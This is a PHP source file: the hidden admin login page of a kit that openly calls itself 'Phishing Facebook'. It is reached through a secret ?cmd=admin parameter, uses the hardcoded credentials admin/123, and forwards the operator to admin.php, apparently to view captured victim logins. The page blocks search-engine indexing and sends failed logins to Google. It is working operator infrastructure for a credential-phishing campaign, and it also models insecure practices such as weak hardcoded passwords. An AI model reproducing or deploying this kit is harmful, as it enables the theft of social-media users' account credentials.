<?php
//by: Davyd Maker

error_reporting(0);
session_start();
if($_SESSION["usuario"] == "admin" && $_SESSION["senha"] == "123"){
		header('Location: admin.php');
	}else{
if($_GET['cmd'] == "admin"){
	?>
<html>
<head>
<title>Admin - Phishing Facebook</title>
	<link rel="stylesheet" type="text/css" href="estilo.css"/>
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
	<meta charset="utf-8"/>
	<meta name="robots" content="NOINDEX, NOFOLLOW"/>
</head>
<body>
	<div class="formulario">
	<h1><center><font color="white">Phishing Facebook</font></center></h1>
		<form method="post" align="center" action="">
			<input type="hidden" name="conf" value="1"/>
			<div class="grupo">
				<label for="login">Usuário</label>
				<input type="text" name="login" id="login"/>
			</div>
			<div class="rodape grupo">
				<label for="senha">Senha</label>
				<input type="password" name="senha" id="senha"/>
			</div>
			<input type="submit" name="logar" value="Entrar" class="botaoEnviar"/>			 
		</form>
	<?php 		
		if(isset($_POST['conf'])){
	      $usuario = $_POST['login'];
		  $senha = $_POST['senha'];
		  
		  if ($usuario === "admin" && $senha === "123") {
		  	$_SESSION['usuario'] = $usuario;
		  	$_SESSION['senha'] = $senha;
			header('Location: admin.php');
		  } else {
			header('Location: http://www.google.com');
		  }
	   }
	?>
	</div>
</body>
</html>
<?php }else{
	header('Location: ../');
}}
?>
